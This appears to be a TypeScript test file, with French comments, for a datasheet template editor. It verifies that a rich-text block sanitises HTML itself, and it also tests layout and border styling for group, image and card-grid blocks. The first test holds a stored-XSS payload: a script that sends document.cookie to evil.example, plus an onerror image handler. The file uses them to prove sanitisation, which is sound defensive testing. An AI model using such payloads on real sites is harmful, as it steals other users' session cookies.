import { test } from "node:test";
import assert from "node:assert/strict";
import { createElement, type ReactElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { datasheetConfig } from "./registry";

/**
 * DEFAUT LIVRE : le bloc « Texte riche (HTML) » comptait sur le SEUL appelant
 * (src/lib/prepare.ts) pour avoir assaini le HTML avant de l'injecter par
 * `dangerouslySetInnerHTML`. Ca tient sur le chemin de rendu de production —
 * mais le canevas LIVE de l'editeur Puck appelle ce meme composant directement
 * avec ce que la personne vient de taper dans le champ « Contenu HTML »,
 * SANS jamais traverser prepare.ts.
 *
 * Un editeur pouvait donc enregistrer un brouillon avec <script> dans ce champ,
 * et il s'executait dans le navigateur de quiconque rouvrait ensuite ce
 * brouillon dans l'editeur — un autre editeur, un administrateur. Une XSS
 * stockee entre comptes a privilege, pas seulement contre son propre auteur.
 *
 * CE TEST APPELLE LE COMPOSANT DIRECTEMENT, sans passer par prepare.ts —
 * exactement le chemin que prend le canevas de l'editeur — pour verrouiller
 * que l'assainissement se fait desormais AU POINT DE RENDU, quel que soit
 * l'appelant.
 */

function markup(node: unknown): string {
  return renderToStaticMarkup(node as ReactElement);
}

test("le bloc Texte riche assainit lui-meme, meme sans passer par prepare.ts", () => {
  const sortie = markup(
    datasheetConfig.components.RichText.render({
      html: "<p>legitime</p><script>fetch('http://evil.example/'+document.cookie)</script><img src=x onerror=alert(1)>",
      size: 9,
      columns: 1,
    } as never),
  );

  assert.doesNotMatch(sortie, /<script/i, "balise <script> non assainie dans le canevas live");
  assert.doesNotMatch(sortie, /onerror=/i, "gestionnaire d'evenement non assaini");
  assert.match(sortie, /legitime/, "le contenu licite doit survivre a l'assainissement");
});

test("un contenu deja assaini par prepare.ts traverse sans etre altere", () => {
  // sanitizeRichHtml() doit etre IDEMPOTENTE : le reappliquer sur le chemin de
  // production (ou prepare.ts l'a deja fait une fois) ne doit rien changer.
  const propre = "<p>Description <strong>complete</strong>.</p>";
  const sortie = markup(datasheetConfig.components.RichText.render({ html: propre, size: 9, columns: 1 } as never));

  assert.match(sortie, /Description <strong>complete<\/strong>\./);
});

/**
 * Le Groupe n'existe que pour l'editeur (deplacer des blocs ensemble, en faire
 * un composant) : a l'impression, il ne doit RIEN ajouter — ni fond, ni
 * bordure, ni marge, ni etiquette d'editeur —, seulement empiler ses blocs.
 */
test("le bloc Groupe n'imprime que l'empilement de ses blocs", () => {
  const Content = () => createElement("p", null, "contenu");
  const sortie = markup(datasheetConfig.components.Group.render({ avoidBreak: false, content: Content } as never));

  assert.match(sortie, /<p>contenu<\/p>/);
  assert.match(sortie, /display:flex/);
  // Sans espacement saisi : celui de la zone, pour que grouper ne deplace rien.
  assert.match(sortie, /gap:inherit/);
  assert.doesNotMatch(sortie, /background|border|padding|ds-tag/);

  const espace = markup(
    datasheetConfig.components.Group.render({ contentGap: 2, avoidBreak: false, content: Content } as never)
  );
  assert.match(espace, /gap:2mm/);
});

/**
 * Bordure des images (blocs Image et Schema coté). Le piege : une propriete
 * ecrite par defaut, meme neutre, changerait le HTML de tous les templates deja
 * publies. Par defaut, RIEN ne doit apparaitre.
 */
for (const type of ["Image", "SchemaImage"] as const) {
  const entry = datasheetConfig.components[type];
  const rendu = (extra: Record<string, unknown>) =>
    markup(entry.render({ ...entry.defaultProps, source: "data:image/png;base64,AAA", ...extra } as never));

  test(`${type} : sans reglage, ni bordure, ni espace, ni arrondi dans le HTML`, () => {
    assert.doesNotMatch(rendu({}), /border|padding|box-sizing/);
  });

  test(`${type} : bordure, espace et arrondi, sans deborder de la colonne`, () => {
    const sortie = rendu({ borderWidth: 1.5, borderColor: "#8c8272", padding: 2, radius: 3 });
    assert.match(sortie, /border:1\.5pt solid #8c8272/);
    assert.match(sortie, /padding:2mm/);
    assert.match(sortie, /border-radius:3mm/);
    assert.match(sortie, /box-sizing:border-box/);
    // Sans couleur saisie : celle du texte.
    assert.match(rendu({ borderWidth: 1 }), /border:1pt solid currentColor/);
  });
}

/**
 * Cadre des images de la Grille de fiches. Par defaut : EXACTEMENT le style
 * d'avant (0,5 pt, sans marge ni arrondi) — les fiches publiees ne bougent pas.
 * Regle : l'epaisseur, la marge et l'arrondi demandes.
 */
test("Grille de fiches : cadre inchange par defaut, epaisseur, marge et arrondi reglables", () => {
  const entry = datasheetConfig.components.CardGrid;
  const rendu = (extra: Record<string, unknown>) =>
    markup(
      entry.render({
        ...entry.defaultProps,
        source: "",
        items: [{ name: "Cloison", image: "data:image/png;base64,AAA" }],
        ...extra,
      } as never)
    );

  const defaut = rendu({});
  assert.match(defaut, /border:0\.5pt solid #d9d9d9/);
  assert.match(defaut, /box-sizing:content-box/);
  assert.doesNotMatch(defaut, /border-radius|padding:/);

  const regle = rendu({ borderWidth: 1, padding: 2, radius: 1.5 });
  assert.match(regle, /border:1pt solid #d9d9d9/);
  assert.match(regle, /padding:2mm/);
  assert.match(regle, /border-radius:1\.5mm/);
  assert.match(regle, /box-sizing:border-box/);

  // Sans cadre, ni marge ni arrondi.
  assert.doesNotMatch(rendu({ border: false, padding: 2, radius: 1.5 }), /border|padding:/);
});
